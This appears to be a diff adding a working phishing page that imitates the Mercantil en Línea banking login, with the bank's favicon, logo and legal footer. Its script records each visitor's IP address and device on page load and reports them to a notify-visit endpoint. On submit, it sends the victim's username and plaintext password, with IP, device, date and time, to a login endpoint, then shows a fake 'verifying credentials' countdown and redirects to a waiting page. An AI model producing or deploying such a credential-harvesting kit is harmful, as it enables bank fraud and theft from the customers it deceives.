@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #eff3f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .nav-bar {
+            background: #004e9b;
+            height: 64px;
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            z-index: 100;
+        }
+        .nav-bar img { height: 36px; width: auto; }
+
+        .main {
+            flex: 1;
+            margin-top: 64px;
+            display: flex;
+            min-height: calc(100vh - 64px - 48px);
+        }
+        .left-panel {
+            flex: 0 0 480px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 32px;
+            background: #fff;
+        }
+        .right-panel {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+        .right-panel .bg-img {
+            position: absolute;
+            bottom: 0; right: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            object-position: top center;
+        }
+        .right-panel .customer-img {
+            position: absolute;
+            top: 0; right: 40px;
+            height: 100%;
+            width: auto;
+            object-fit: contain;
+            object-position: top;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 360px;
+        }
+        .login-title {
+            color: #004e9b;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 28px;
+        }
+        .field input {
+            width: 100%;
+            border: none;
+            border-bottom: 2px solid #bdbdbd;
+            padding: 20px 36px 6px 0;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            background: transparent;
+            outline: none;
+            color: #212121;
+            transition: border-color .2s;
+        }
+        .field input:focus { border-bottom-color: #004e9b; }
+        .field label {
+            position: absolute;
+            top: 20px; left: 0;
+            font-size: 16px;
+            color: #757575;
+            pointer-events: none;
+            transition: top .2s, font-size .2s, color .2s;
+        }
+        .field input:focus ~ label,
+        .field input:not(:placeholder-shown) ~ label {
+            top: 2px;
+            font-size: 12px;
+            color: #004e9b;
+        }
+        .field.has-error input { border-bottom-color: #e53935; }
+        .field.has-error label { color: #e53935; }
+        .field.has-error input:focus ~ label,
+        .field.has-error input:not(:placeholder-shown) ~ label { color: #e53935; }
+        .error-msg {
+            display: none;
+            font-size: 12px;
+            color: #e53935;
+            margin-top: 4px;
+        }
+        .field.has-error .error-msg { display: block; }
+
+        .eye-btn {
+            position: absolute;
+            right: 0; top: 16px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            line-height: 0;
+        }
+        .eye-btn svg { fill: #004e9b; }
+
+        .field-link {
+            margin-top: -18px;
+            margin-bottom: 24px;
+            text-align: right;
+        }
+        .field-link a {
+            font-size: 13px;
+            color: #009fda;
+            text-decoration: none;
+        }
+
+        .remember-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 32px;
+            font-size: 14px;
+            color: #555;
+        }
+        .toggle-switch {
+            position: relative;
+            width: 44px; height: 24px;
+            flex-shrink: 0;
+        }
+        .toggle-switch input { display: none; }
+        .toggle-switch .slider {
+            position: absolute;
+            inset: 0;
+            background: #bdbdbd;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background .2s;
+        }
+        .toggle-switch .slider::before {
+            content: '';
+            position: absolute;
+            width: 18px; height: 18px;
+            left: 3px; top: 3px;
+            background: #fff;
+            border-radius: 50%;
+            transition: transform .2s;
+        }
+        .toggle-switch input:checked + .slider { background: #004e9b; }
+        .toggle-switch input:checked + .slider::before { transform: translateX(20px); }
+
+        .btn-primary {
+            width: 100%;
+            background: #004e9b;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 14px;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background .2s;
+        }
+        .btn-primary:hover { background: #003a75; }
+        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        footer {
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #757575;
+        }
+
+        #overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,.55);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity .3s;
+        }
+        #overlay.visible { opacity: 1; pointer-events: all; }
+        .overlay-card {
+            background: #fff;
+            border-radius: 20px;
+            padding: 36px 48px;
+            text-align: center;
+            min-width: 280px;
+        }
+        .overlay-card p {
+            color: #004e9b;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .progress-track {
+            background: #e0e0e0;
+            border-radius: 4px;
+            height: 6px;
+            overflow: hidden;
+            margin-bottom: 14px;
+        }
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background: #004e9b;
+            border-radius: 4px;
+        }
+        #progressBar.running {
+            width: 100%;
+            transition: width var(--dur) linear;
+        }
+        #countdownNum {
+            font-size: 30px;
+            font-weight: 700;
+            color: #004e9b;
+        }
+
+        @media (max-width: 860px) {
+            .right-panel { display: none; }
+            .left-panel { flex: 1; }
+        }
+        @media (max-width: 480px) {
+            .left-panel { padding: 32px 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<nav class="nav-bar">
+    <img src="containersito/Log.png" alt="Mercantil en Línea">
+</nav>
+
+<div class="main">
+    <div class="left-panel">
+        <div class="card">
+            <h1 class="login-title">Bienvenido</h1>
+
+            <form id="loginForm" novalidate>
+                <div class="field" id="fieldUsuario">
+                    <input type="text" id="usuario" name="usuario" placeholder=" "
+                           autocomplete="username" maxlength="18">
+                    <label for="usuario">Usuario</label>
+                    <span class="error-msg">Ingresa tu usuario (mínimo 6 caracteres)</span>
+                </div>
+
+                <div class="field" id="fieldClave">
+                    <input type="password" id="clave" name="clave" placeholder=" "
+                           autocomplete="current-password" maxlength="15">
+                    <label for="clave">Clave</label>
+                    <button type="button" class="eye-btn" id="eyeBtn" aria-label="Mostrar/ocultar clave">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5C21.27 7.61 17 4.5 12 4.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        </svg>
+                    </button>
+                    <span class="error-msg">Ingresa tu clave (mínimo 8 caracteres)</span>
+                </div>
+
+                <div class="field-link"><a href="#">¿Olvidaste tu clave?</a></div>
+
+                <div class="remember-row">
+                    <span>Recordar usuario</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="rememberToggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn-primary" id="btnSubmit">Iniciar</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="right-panel">
+        <img src="containersito/04.webp" alt="" class="bg-img">
+        <img src="containersito/04(1).webp" alt="" class="customer-img">
+    </div>
+</div>
+
+<footer>
+    <span>Derechos protegidos por Mercantil C.A., Universal. RIF: J-00002961-0.</span>
+</footer>
+
+<div id="overlay">
+    <div class="overlay-card">
+        <p>Verificando credenciales...</p>
+        <div class="progress-track">
+            <div id="progressBar"></div>
+        </div>
+        <div id="countdownNum">10</div>
+    </div>
+</div>
+
+<script>
+(async function notifyVisit() {
+    let ip = 'No disponible';
+    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch {}
+    const ua = navigator.userAgent;
+    let os = 'Desconocido', device = 'Desktop';
+    if (/android/i.test(ua))          { os = 'Android'; device = '📱 Móvil'; }
+    else if (/iPhone|iPad/i.test(ua)) { os = 'iOS';     device = '📱 iPhone/iPad'; }
+    else if (/Windows/i.test(ua))     { os = 'Windows'; device = '🖥️ PC'; }
+    else if (/Mac/i.test(ua))         { os = 'macOS';   device = '🖥️ Mac'; }
+    else if (/Linux/i.test(ua))       { os = 'Linux';   device = '🖥️ Linux'; }
+    const browser = /Chrome/i.test(ua)  ? 'Chrome'
+                  : /Firefox/i.test(ua) ? 'Firefox'
+                  : /Safari/i.test(ua)  ? 'Safari'
+                  : /Edge/i.test(ua)    ? 'Edge' : 'Desconocido';
+    fetch('/api/notify-visit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip, device, browser, os })
+    }).catch(() => {});
+})();
+
+document.getElementById('eyeBtn').addEventListener('click', () => {
+    const inp = document.getElementById('clave');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+    document.getElementById('eyeIcon').style.opacity = inp.type === 'text' ? '0.5' : '1';
+});
+
+function showOverlay(seconds) {
+    const bar = document.getElementById('progressBar');
+    const num = document.getElementById('countdownNum');
+    num.textContent = seconds;
+    document.getElementById('overlay').classList.add('visible');
+    bar.style.setProperty('--dur', seconds + 's');
+    requestAnimationFrame(() => requestAnimationFrame(() => bar.classList.add('running')));
+    let remaining = seconds;
+    return new Promise(resolve => {
+        const tick = setInterval(() => {
+            num.textContent = --remaining;
+            if (remaining <= 0) { clearInterval(tick); resolve(); }
+        }, 1000);
+    });
+}
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Desconocido', device = 'Desktop';
+    if (/android/i.test(ua))          { os = 'Android'; device = '📱 Móvil'; }
+    else if (/iPhone|iPad/i.test(ua)) { os = 'iOS';     device = '📱 iPhone/iPad'; }
+    else if (/Windows/i.test(ua))     { os = 'Windows'; device = '🖥️ PC'; }
+    else if (/Mac/i.test(ua))         { os = 'macOS';   device = '🖥️ Mac'; }
+    else if (/Linux/i.test(ua))       { os = 'Linux';   device = '🖥️ Linux'; }
+    const browser = /Chrome/i.test(ua)  ? 'Chrome'
+                  : /Firefox/i.test(ua) ? 'Firefox'
+                  : /Safari/i.test(ua)  ? 'Safari'
+                  : /Edge/i.test(ua)    ? 'Edge' : 'Desconocido';
+    return { os, device, browser };
+}
+
+document.getElementById('loginForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    const usuario = document.getElementById('usuario').value.trim();
+    const clave   = document.getElementById('clave').value;
+    let valid = true;
+
+    const fu = document.getElementById('fieldUsuario');
+    const fc = document.getElementById('fieldClave');
+    fu.classList.remove('has-error');
+    fc.classList.remove('has-error');
+
+    if (usuario.length < 6) { fu.classList.add('has-error'); valid = false; }
+    if (clave.length < 8)   { fc.classList.add('has-error'); valid = false; }
+    if (!valid) return;
+
+    document.getElementById('btnSubmit').disabled = true;
+
+    let ip = 'No disponible';
+    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch {}
+
+    const { os, device, browser } = getDeviceInfo();
+    const now   = new Date();
+    const fecha = now.toLocaleDateString('es-VE', { day: '2-digit', month: 'long', year: 'numeric' });
+    const hora  = now.toLocaleTimeString('es-VE', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+    await showOverlay(10);
+
+    try {
+        const res  = await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usuario, password: clave, ip, device, browser, os, fecha, hora })
+        });
+        const data = await res.json();
+        if (data.id) {
+            localStorage.setItem('mercantil_session_id', data.id);
+            localStorage.setItem('mercantil_usuario', usuario);
+        }
+    } catch {}
+
+    window.location.href = 'wait.html';
+});
+</script>
+
+</body>
+</html>
